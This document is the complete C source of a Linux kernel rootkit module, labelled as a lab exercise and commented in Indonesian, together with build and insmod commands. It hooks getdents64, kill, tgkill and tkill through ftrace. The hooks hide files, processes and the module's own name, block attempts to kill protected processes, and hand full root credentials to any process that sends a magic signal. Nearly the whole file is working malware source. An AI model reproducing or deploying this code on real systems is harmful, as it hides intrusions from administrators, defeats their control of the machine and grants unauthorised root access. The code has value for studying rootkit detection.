// rootkit.c — LKM rootkit modern via ftrace (kernel 6.8 ready).
//
// Teknik: ftrace IPMODIFY redirect, TANPA patch sys_call_table / CR0.WP.
// Resolusi alamat via kprobe(kallsyms_lookup_name) — pola yang sama seperti
// labs/syscall-hook/kmod, tapi hook-nya jauh lebih stealth.
//
// Fitur (full stealth pack, semua via module_param):
//   - hide file/dir: entry getdents64 yang mengandung hide_prefix -> difilter
//   - hide proses  : PID yang comm-nya mengandung proc_prefix, atau == hide_pid
//   - hide module  : sembunyikan NAMA modul dari listing direktori (/sys/module);
//                    /proc/modules (lsmod) tetap menampilkan modul dan rmmod selalu jalan
//   - privesc       : kill(<pid>, SIG_MAGIC) -> commit_creds(root) untuk caller
//   - anti-kill     : kill() ke PID proteksi (protect_pid / proc_prefix) -> -EPERM
//
// Build & pakai (DI VPS, bukan lokal):
//   make -C /lib/modules/$(uname -r)/build M=$PWD modules
//   sudo insmod rootkit.ko hide_prefix="rk_" proc_prefix="rk_" sig_magic=64 hide_module=1
//   sudo rmmod rootkit
//   dmesg | tail
//
// Default aman untuk lab: prefix "rk_", signal 64, modul disembunyikan.
// Hapus dengan rmmod selalu bisa: module->list tidak pernah diubah.

#include <linux/cred.h>
#include <linux/capability.h>
#include <linux/dirent.h>
#include <linux/err.h>
#include <linux/ftrace.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/kprobes.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/signal.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/vmalloc.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("lab xcb-v2");
MODULE_DESCRIPTION("ftrace rootkit lab: hide file/proc/module + privesc + anti-kill");

// ---- params ----
static char hide_prefix[32] = "rk_";
module_param_string(hide_prefix, hide_prefix, sizeof(hide_prefix), 0644);
MODULE_PARM_DESC(hide_prefix, "substring file/dir yang disembunyikan dari getdents64");

static char proc_prefix[32] = "rk_";
module_param_string(proc_prefix, proc_prefix, sizeof(proc_prefix), 0644);
MODULE_PARM_DESC(proc_prefix, "substring comm proses yang disembunyikan + diproteksi kill");

static int hide_pid = -1;
module_param(hide_pid, int, 0644);
MODULE_PARM_DESC(hide_pid, "PID spesifik yang disembunyikan + diproteksi");

static int protect_pid = -1;
module_param(protect_pid, int, 0644);
MODULE_PARM_DESC(protect_pid, "PID spesifik yang diproteksi dari kill");

static int sig_magic = 64;
module_param(sig_magic, int, 0644);
MODULE_PARM_DESC(sig_magic, "sinyal pemicu privesc: kill(<pid>, sig_magic) -> euid 0");

static int sig_unhide = 63;
module_param(sig_unhide, int, 0644);
MODULE_PARM_DESC(sig_unhide, "sinyal pemuncul modul: kill(<pid>, sig_unhide) -> modul terlihat lagi (wajib sebelum rmmod bila hide_module=1)");

static int hide_module = 1;
module_param(hide_module, int, 0644);
MODULE_PARM_DESC(hide_module, "1 = sembunyikan LKM dari lsmod/sysfs");

// ---- resolver kallsyms via kprobe ----
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t ksym_lookup_addr;

static int resolve_kallsyms(void) {
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    int ret = register_kprobe(&kp);
    if (ret < 0)
        return ret;
    ksym_lookup_addr = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
    if (!ksym_lookup_addr)
        return -ENOENT;
    return 0;
}

// ---- ftrace hook framework ----
struct ftrace_hook {
    const char *name;
    void *func;
    void *orig;
    unsigned long addr;
    struct ftrace_ops ops;
};

static int fh_resolve(struct ftrace_hook *h) {
    h->addr = ksym_lookup_addr(h->name);
    if (!h->addr) {
        pr_err("[rk] resolve %s gagal\n", h->name);
        return -ENOENT;
    }
    *((unsigned long *)h->orig) = h->addr;
    return 0;
}

static void notrace fh_thunk(unsigned long ip, unsigned long parent_ip,
                             struct ftrace_ops *ops, struct ftrace_regs *fregs) {
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook *h = container_of(ops, struct ftrace_hook, ops);
    if (!regs)
        return;
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)h->func;
}

static int fh_install(struct ftrace_hook *h) {
    int err;
    err = fh_resolve(h);
    if (err)
        return err;
    h->ops.func = fh_thunk;
    h->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION |
                   FTRACE_OPS_FL_IPMODIFY;
    err = ftrace_set_filter_ip(&h->ops, h->addr, 0, 0);
    if (err) {
        pr_err("[rk] filter %s gagal: %d\n", h->name, err);
        return err;
    }
    err = register_ftrace_function(&h->ops);
    if (err) {
        pr_err("[rk] register %s gagal: %d\n", h->name, err);
        ftrace_set_filter_ip(&h->ops, h->addr, 1, 0);
        return err;
    }
    return 0;
}

static void fh_remove(struct ftrace_hook *h) {
    int err = unregister_ftrace_function(&h->ops);
    if (err)
        pr_err("[rk] unregister %s gagal: %d\n", h->name, err);
    err = ftrace_set_filter_ip(&h->ops, h->addr, 1, 0);
    if (err)
        pr_err("[rk] unfilter %s gagal: %d\n", h->name, err);
}

// ---- helpers ----
static int pid_hidden(pid_t pid) {
    struct task_struct *task;
    char comm[TASK_COMM_LEN];
    int hidden = 0;

    if (hide_pid > 0 && pid == hide_pid)
        return 1;
    if (protect_pid > 0 && pid == protect_pid)
        return 1;
    if (proc_prefix[0] == '\0')
        return 0;

    rcu_read_lock();
    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    if (task) {
        get_task_comm(comm, task);
        if (strstr(comm, proc_prefix))
            hidden = 1;
    }
    rcu_read_unlock();
    return hidden;
}

static int pid_protected(pid_t pid) {
    struct task_struct *task;
    char comm[TASK_COMM_LEN];
    int prot = 0;

    if ((hide_pid > 0 && pid == hide_pid) || (protect_pid > 0 && pid == protect_pid))
        return 1;
    if (proc_prefix[0] == '\0')
        return 0;

    rcu_read_lock();
    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    if (task) {
        get_task_comm(comm, task);
        if (strstr(comm, proc_prefix))
            prot = 1;
    }
    rcu_read_unlock();
    return prot;
}

static void give_root(void) {
    // prepare_kernel_cred() di-WARN (cred.c) + return NULL di 6.8-Ubuntu saat
    // dipanggil dari task dengan LSM blob. Pola standar 5.x+: salin creds
    // sendiri via prepare_creds(), nol-kan IDs, angkat semua caps.
    struct cred *c = prepare_creds();
    if (!c) {
        pr_err("[rk] prepare_creds gagal\n");
        return;
    }
    c->uid = c->euid = c->suid = c->fsuid = KUIDT_INIT(0);
    c->gid = c->egid = c->sgid = c->fsgid = KGIDT_INIT(0);
    c->cap_inheritable = c->cap_permitted = c->cap_effective = CAP_FULL_SET;
    c->cap_bset = c->cap_ambient = CAP_FULL_SET;
    commit_creds(c);
    pr_info("[rk] privesc OK: euid=0 untuk pid %d (%s)\n", current->pid, current->comm);
}

static void give_root(void);
static void unhide_this_module(void);
static void hide_this_module(void);

// State hide-module dibaca hook getdents64 (didefinisikan di bawah).
// Tidak ada pointer list: modul tidak pernah dikeluarkan dari module->list.
static bool module_hidden = false;

// ---- orig pointers ----
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_tgkill)(const struct pt_regs *);
static asmlinkage long (*orig_tkill)(const struct pt_regs *);

// ---- hook getdents64: filter file + PID tersembunyi ----
// Buffer vmalloc fixed-size (bukan kmalloc(n) dinamis): hardened usercopy
// (6.8) menolak copy dinamis dari slab bila size class tak cocok; vmalloc
// area divalidasi per-area sehingga aman. Bila n melebihi buffer, job
// dikembalikan tanpa filter (fail-open, bukan oops).
// Pencocokan substring yang TIDAK pernah membaca lewat akhir record.
// d_name getdents64 memang NUL-terminated, tapi strstr() polos tetap berisiko
// over-read bila kernel mengembalikan batch torn; batasi ke dalam record.
static int name_has_mark(const char *name, size_t maxlen, const char *mark) {
    size_t mlen = strlen(mark);
    size_t i;
    if (mlen == 0 || maxlen <= mlen)
        return 0;
    for (i = 0; i + mlen <= maxlen; i++) {
        if (name[i] == '\0')
            break;
        if (memcmp(name + i, mark, mlen) == 0)
            return 1;
    }
    return 0;
}

#define DIRENT64_HDR (sizeof(__u64) * 2 + sizeof(__u16) + sizeof(unsigned char))

static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
    char __user *buf = (char __user *)regs->si;
    long n, in, out;
    char *tmp;
    struct linux_dirent64 *e;

    /* Filter dijalankan sampai satu batch menghasilkan isi. Tanpa loop,
     * batch yang seluruhnya tersembunyi mengembalikan 0 = EOF palsu bagi
     * pemanggil, sehingga entry pada batch berikutnya tidak pernah dibaca.
     * Alokasi mengikuti n (bukan buffer tetap): buffer besar tidak lagi
     * melewati filter. */
    for (;;) {
    n = orig_getdents64(regs);
    if (n <= 0)
        return n;
    if (!access_ok(buf, n))
        return n;
    tmp = vmalloc(n);
    if (!tmp)
        return n;
    if (copy_from_user(tmp, buf, n)) {
        vfree(tmp);
        return n;
    }
    in = 0;
    out = 0;

    while (in < n) {
        int hide = 0;
        e = (struct linux_dirent64 *)(tmp + in);
        // Validasi ketat sebelum sentuh d_name: reclen 0 / terlalu kecil /
        // melewati buffer = batch korup (atau torn read) -> setop di sini
        // daripada memfilter buta dan merusak batch.
        if (e->d_reclen < sizeof(struct linux_dirent64) || in + e->d_reclen > n)
            break;
        // 1) sembunyikan file/dir by prefix (bounded, tanpa over-read)
        if (hide_prefix[0] != '\0' &&
            name_has_mark(e->d_name, (size_t)e->d_reclen - DIRENT64_HDR, hide_prefix))
            hide = 1;
        // 1b) sembunyikan nama modul sendiri dari listing dir (cover
        // /sys/module). Exact match bounded: butuh NUL dalam record.
        if (!hide && module_hidden) {
            size_t mlen = strlen(THIS_MODULE->name);
            size_t maxlen = (size_t)e->d_reclen - DIRENT64_HDR;
            if (maxlen > mlen && memcmp(e->d_name, THIS_MODULE->name, mlen) == 0 &&
                e->d_name[mlen] == '\0')
                hide = 1;
        }
        // 2) kalau entry berupa angka -> kandidat PID di /proc
        if (!hide && e->d_name[0] >= '0' && e->d_name[0] <= '9') {
            pid_t pid = 0;
            const char *p = e->d_name;
            int numeric = 1;
            int digits = 0;
            while (*p) {
                if (*p < '0' || *p > '9' || ++digits > 10) {
                    numeric = 0;
                    break;
                }
                pid = pid * 10 + (*p - '0');
                p++;
            }
            if (numeric && pid_hidden(pid))
                hide = 1;
        }
        if (!hide) {
            if (out != in)
                memmove(tmp + out, e, e->d_reclen);
            out += e->d_reclen;
        }
        in += e->d_reclen;
    }
    if (out > n)
        out = n;
    if (out && copy_to_user(buf, tmp, out)) {
        vfree(tmp);
        return n; // gagal tulis balik: kembalikan asli daripada rusak
    }
    vfree(tmp);
    if (out > 0)
        return out;
    /* Semua entry batch ini disembunyikan: ambil batch berikutnya. */
    }
}

// ---- hook kill: privesc + anti-kill ----
static asmlinkage long hook_kill(const struct pt_regs *regs) {
    pid_t pid = (pid_t)regs->di;
    int sig = (int)regs->si;

    // sig_magic bisa diubah runtime menjadi 0 lewat /sys/module/.../parameters.
    // kill(pid, 0) adalah uji eksistensi biasa; tanpa guard ini, siapa pun bisa
    // memicunya untuk privesc.
    if (sig_magic > 0 && sig == sig_magic) {
        pr_info("[rk] magic signal %d dari pid %d -> privesc\n", sig, current->pid);
        give_root();
        return 0;
    }
    if (sig_unhide > 0 && sig == sig_unhide) {
        pr_info("[rk] unhide signal %d dari pid %d\n", sig, current->pid);
        unhide_this_module();
        return 0;
    }
    if ((pid == 0 || pid_protected(pid) || (pid < 0 && pid_protected(-pid))) &&
        (sig == SIGKILL || sig == SIGTERM || sig == SIGSTOP)) {
        pr_info("[rk] kill(%d, %d) ditolak (proteksi)\n", pid, sig);
        return -EPERM;
    }
    return orig_kill(regs);
}

// tgkill(2)/tkill(2) melewati hook kill() di atas; tanpa ini proteksi bisa
// dilewati dengan satu syscall lain.
static asmlinkage long hook_tgkill(const struct pt_regs *regs) {
    const pid_t tgid = (pid_t)regs->di;
    const pid_t tid = (pid_t)regs->si;
    const int sig = (int)regs->dx;
    if (sig_magic > 0 && sig == sig_magic) {
        give_root();
        return 0;
    }
    if (sig_unhide > 0 && sig == sig_unhide) {
        unhide_this_module();
        return 0;
    }
    if ((pid_protected(tid) || pid_protected(tgid)) &&
        (sig == SIGKILL || sig == SIGTERM || sig == SIGSTOP)) {
        pr_info("[rk] tgkill(%d, %d, %d) ditolak (proteksi)\n", tgid, tid, sig);
        return -EPERM;
    }
    return orig_tgkill(regs);
}

static asmlinkage long hook_tkill(const struct pt_regs *regs) {
    const pid_t tid = (pid_t)regs->di;
    const int sig = (int)regs->si;
    if ((pid_protected(tid)) && (sig == SIGKILL || sig == SIGTERM || sig == SIGSTOP)) {
        return -EPERM;
    }
    return orig_tkill(regs);
}

static struct ftrace_hook hooks[] = {
    { .name = "__x64_sys_getdents64", .func = hook_getdents64, .orig = &orig_getdents64 },
    { .name = "__x64_sys_kill", .func = hook_kill, .orig = &orig_kill },
    { .name = "__x64_sys_tgkill", .func = hook_tgkill, .orig = &orig_tgkill },
    { .name = "__x64_sys_tkill", .func = hook_tkill, .orig = &orig_tkill },
};
// ---- hide module ----
// TIDAK memutasi module->list lagi. list_del() tanpa module_mutex (tidak
// diekspor ke LKM) adalah race dengan /proc/modules dan, yang lebih buruk,
// delete_module() mencari modul lewat list yang sama sehingga modul yang
// di-hide tidak bisa di-rmmod (dan prev_module bisa dangling -> list
// corruption / UAF).
//
// Yang dilakukan sekarang: sembunyikan NAMA modul ini dari listing direktori
// (getdents64, termasuk /sys/module) lewat module_hidden. /proc/modules
// (lsmod) tetap menampilkan modul — batas ini didokumentasikan di README.
// Keuntungan: rmmod selalu bekerja normal, tidak ada state list yang bisa
// merusak kernel.
static void hide_this_module(void) {
    if (module_hidden)
        return;
    module_hidden = true;
    pr_info("[rk] nama modul disembunyikan dari listing direktori (list kernel TIDAK diubah)\n");
}

static void unhide_this_module(void) {
    if (!module_hidden)
        return;
    module_hidden = false;
    pr_info("[rk] nama modul terlihat lagi\n");
}

static int __init rk_init(void) {
    int i, err;

    pr_info("[rk] init: hide_prefix='%s' proc_prefix='%s' sig=%d hide_mod=%d\n", hide_prefix,
            proc_prefix, sig_magic, hide_module);

    // Nomor sinyal valid Linux: 1..64 (0 = uji eksistensi, >64 = EINVAL).
    // Tanpa clamp, kill(2) mentah pun gagal dan user bingung.
    if (sig_magic < 1 || sig_magic > 64) {
        pr_err("[rk] sig_magic=%d di luar 1..64\n", sig_magic);
        return -EINVAL;
    }
    if (sig_unhide < 1 || sig_unhide > 64) {
        pr_err("[rk] sig_unhide=%d di luar 1..64\n", sig_unhide);
        return -EINVAL;
    }
    // Jika keduanya sama, cabang magic selalu menang dan modul tidak pernah
    // bisa dimunculkan lagi.
    if (sig_magic == sig_unhide) {
        pr_err("[rk] sig_magic == sig_unhide (%d): tolak load\n", sig_magic);
        return -EINVAL;
    }

    err = resolve_kallsyms();
    if (err) {
        pr_err("[rk] kallsyms resolver gagal: %d (kptr_restrict? butuh root)\n", err);
        return err;
    }
    for (i = 0; i < (int)(sizeof(hooks) / sizeof(hooks[0])); i++) {
        err = fh_install(&hooks[i]);
        if (err)
            goto fail;
    }
    if (hide_module)
        hide_this_module();
    pr_info("[rk] terpasang: %zu hook ftrace aktif\n", sizeof(hooks) / sizeof(hooks[0]));
    pr_info("[rk] uji: touch /tmp/rk_rahasia; ls /tmp | grep rk_ (kosong); kill -%d $$; id (uid=0)\n",
            sig_magic);
    return 0;

fail:
    while (i-- > 0)
        fh_remove(&hooks[i]);
    return err;
}

static void __exit rk_exit(void) {
    int i;
    for (i = 0; i < (int)(sizeof(hooks) / sizeof(hooks[0])); i++)
        fh_remove(&hooks[i]);
    unhide_this_module();
    pr_info("[rk] dicabut, hook direstore\n");
}

module_init(rk_init);
module_exit(rk_exit);
